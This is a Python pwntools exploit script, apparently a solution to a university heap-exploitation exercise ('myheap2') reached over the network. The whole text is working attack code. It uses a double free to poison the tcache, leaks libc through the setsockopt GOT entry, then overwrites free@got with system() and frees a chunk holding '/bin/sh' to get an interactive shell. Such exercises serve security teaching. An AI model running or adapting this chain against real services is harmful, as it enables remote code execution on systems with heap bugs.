from pwn import *

context.binary = ELF('./myheap2')
libc = ELF('./libc.so.6')

def get_process():
    if args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4462)
    else:
        return remote("localhost", 4462)

# useful addresses
free_got = context.binary.got['free']
log.info("free@got: " + hex(free_got))
setsockopt_got = context.binary.got['setsockopt']
log.info("setsockopt@got: " + hex(setsockopt_got))

setsockopt_offset = libc.symbols['setsockopt']
log.info("setsockopt@libc: " + hex(setsockopt_offset))
system_offset = libc.symbols['system']
log.info("system@libc: " + hex(system_offset))

p = get_process()

p.sendline(b'cA08') # create chunk of size 8

p.sendline(b'dA') # delete chunk 0
p.sendline(b'dA') # delete chunk 0 again (double free)

p.sendline(b'cB08') # create chunk of size 8 (reuses chunk 0)
p.sendline(b'aB' + p64(setsockopt_got -16)) # assign chunk B (reuses chunk 0), overwrite fd pointer

p.sendline(b'cC08') # create chunk of size 8, moves fd to the cachebin head
p.sendline(b'cD08') # create chunk of size 8, overlap with setsockopt@got

p.sendline(b'sD') # show chunk D
leak = b''
while len(leak) < 8:
    leak += p.recvn(8 - len(leak))

setsockopt_leak = u64(leak)
log.info("setsockopt@libc leak: " + hex(setsockopt_leak))
libc_base = setsockopt_leak - setsockopt_offset
log.info("libc base: " + hex(libc_base))
system_addr = libc_base + system_offset
log.info("system@libc: " + hex(system_addr))

p.close() # close the connection to reset the state
p = get_process()

p.sendline(b'cA08') # create chunk of size 8
p.sendline(b'dA') # delete chunk 0
p.sendline(b'dA') # delete chunk 0 again (double free)
p.sendline(b'cB08') # create chunk of size 8 (reuses chunk 0)
p.sendline(b'aB' + p64(free_got -16)) # assign chunk B (reuses chunk 0), overwrite fd pointer
p.sendline(b'cC08') # create chunk of size 8, moves fd to the cachebin head
p.sendline(b'aC/bin/sh\x00' ) # create chunk of size 8, overlap with free@got, write "/bin/sh"
p.sendline(b'cD08') # create chunk of size 8, now chunk D overlaps with free@got
p.sendline(b'aD' + p64(system_addr))
p.sendline(b'dC') # delete chunk C, which contains "/bin/sh", triggers system("/bin/sh")
p.interactive()